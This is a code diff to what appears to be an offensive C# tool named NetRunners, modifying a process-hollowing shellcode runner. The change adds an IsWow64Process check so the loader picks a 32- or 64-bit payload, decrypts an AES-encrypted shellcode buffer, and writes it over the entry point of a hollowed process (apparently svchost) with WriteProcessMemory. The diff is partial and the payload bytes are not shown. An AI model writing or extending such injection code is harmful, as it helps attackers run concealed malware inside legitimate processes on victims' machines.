@@ -33,6 +33,8 @@ namespace NetRunners.Runners
             byte[] buf = SelectPayloadArchitecture();
             int sBuf = SelectPayloadSize();
 
+            bool IsRemote32BitProcess = false;
+
             try
             {
                 // here we are
@@ -50,6 +52,8 @@ namespace NetRunners.Runners
                 uint tmp = 0;
                 hProcess = pi.hProcess;
                 ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
+
+                IsWow64Process(hProcess, out IsRemote32BitProcess);
 
                 ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
 
@@ -69,15 +73,9 @@ namespace NetRunners.Runners
                 entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
                 addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
 
-                //decrypt buf
-                try
-                {
-                    buf = DecryptBytesToBytesAes(buf, AesKey);
-                }
-                catch (Exception e)
-                {
-                    throw new InvalidOperationException("Decryption of buffer failed.", e);
-                }
+                // select and decrypt payload
+                buf = SelectPayloadArchitecture(IsRemote32BitProcess);
+                buf = DecryptBytesToBytesAes(buf, AesKey);
 
                 // write shellcode to memory
                 WriteProcessMemory(hProcess, addressOfEntryPoint, buf, sBuf, out nRead);
